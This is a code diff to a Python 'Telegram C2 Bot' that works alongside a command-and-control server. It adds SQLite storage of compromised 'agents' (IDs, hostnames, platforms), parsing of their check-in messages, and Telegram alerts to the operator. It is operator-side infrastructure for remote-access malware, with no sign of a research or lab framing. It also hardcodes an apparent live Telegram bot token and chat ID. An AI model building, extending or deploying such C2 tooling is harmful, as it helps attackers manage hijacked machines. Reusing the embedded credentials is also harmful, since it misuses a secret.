@@ -2,14 +2,19 @@
 """
 Telegram C2 Bot - Runs alongside C2 server
 Handles commands and notifications from agents
+Integrates with C2 SQLite database
 """
 
 import os
+import sys
 import json
 import time
+import re
+import sqlite3
 import threading
 import requests
 from datetime import datetime
+from pathlib import Path
 
 # Configuration
 BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc")
@@ -17,9 +22,52 @@ CHAT_ID = os.environ.get("TG_CHAT_ID", "5804150664")
 API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
 POLL_INTERVAL = 3
 
+# Database path
+BASE_DIR = Path(__file__).resolve().parent.parent
+DB_PATH = BASE_DIR / "data" / "c2.db"
+
 # State
 last_update_id = 0
 agents = {}
+
+def get_db():
+    """Get database connection."""
+    conn = sqlite3.connect(str(DB_PATH))
+    conn.row_factory = sqlite3.Row
+    return conn
+
+def save_agent_to_db(agent_id, hostname, platform, username="agent", os_type="linux", arch="x64"):
+    """Save or update agent in C2 database."""
+    try:
+        conn = get_db()
+        db = conn.cursor()
+        
+        # Check if exists
+        db.execute("SELECT id FROM agents WHERE id=?", (agent_id,))
+        existing = db.fetchone()
+        
+        if existing:
+            # Update last_seen
+            db.execute("""
+                UPDATE agents 
+                SET last_seen=datetime('now'), is_alive=1, hostname=?, platform_type=?
+                WHERE id=?
+            """, (hostname, platform, agent_id))
+            print(f"[TG-DB] Updated agent {agent_id[:8]}")
+        else:
+            # Insert new agent
+            db.execute("""
+                INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type, is_alive)
+                VALUES (?, ?, ?, ?, ?, ?, ?, 1)
+            """, (agent_id, hostname, username, os_type, arch, "telegram", platform))
+            print(f"[TG-DB] Inserted agent {agent_id[:8]}")
+        
+        conn.commit()
+        conn.close()
+        return True
+    except Exception as e:
+        print(f"[TG-DB-ERROR] {e}")
+        return False
 
 def send_message(text, chat_id=None, parse_mode="HTML"):
     """Send message via Telegram API."""
@@ -109,23 +157,46 @@ def handle_agent_message(message):
     text = message.get("text", "")
     chat_id = message["chat"]["id"]
     
-    # Parse agent registration
-    if "Agent Online" in text or "🤖" in text:
-        # Extract agent ID
-        import re
-        match = re.search(r'ID: ([a-f0-9-]+)', text)
-        if match:
-            agent_id = match.group(1)
-            agents[agent_id] = {
-                "chat_id": chat_id,
-                "platform": "unknown",
-                "last_seen": datetime.now().isoformat()
-            }
-            print(f"[TG-AGENT] Registered: {agent_id[:8]}")
+    # Parse agent registration message
+    # Format: "🤖 Agent Online\nID: xxx\nPlatform: xxx\nHostname: xxx"
+    agent_id = None
+    hostname = "unknown"
+    platform = "unknown"
     
-    # Forward to admin
+    # Extract agent ID
+    id_match = re.search(r'ID[:\s]+([a-f0-9\-]{8,})', text, re.IGNORECASE)
+    if id_match:
+        agent_id = id_match.group(1)
+    
+    # Extract hostname
+    host_match = re.search(r'Hostname[:\s]+([^\n]+)', text, re.IGNORECASE)
+    if host_match:
+        hostname = host_match.group(1).strip()
+    
+    # Extract platform
+    plat_match = re.search(r'Platform[:\s]+([^\n]+)', text, re.IGNORECASE)
+    if plat_match:
+        platform = plat_match.group(1).strip()
+    
+    # If found agent data, save to database
+    if agent_id:
+        agents[agent_id] = {
+            "chat_id": chat_id,
+            "platform": platform,
+            "hostname": hostname,
+            "last_seen": datetime.now().isoformat()
+        }
+        
+        # Save to C2 database
+        save_agent_to_db(agent_id, hostname, platform)
+        print(f"[TG-AGENT] Registered: {agent_id[:8]} ({hostname})")
+        
+        # Notify admin
+        send_message(f"🤖 <b>New Agent Online</b>\n\nID: <code>{agent_id[:8]}</code>\nHostname: {hostname}\nPlatform: {platform}", CHAT_ID)
+    
+    # Forward all agent messages to admin
     if chat_id != int(CHAT_ID):
-        send_message(f"📩 Agent message:\n{text}", CHAT_ID)
+        send_message(f"📩 Agent message:\n{text[:500]}", CHAT_ID)
 
 def poll_loop():
     """Main polling loop."""
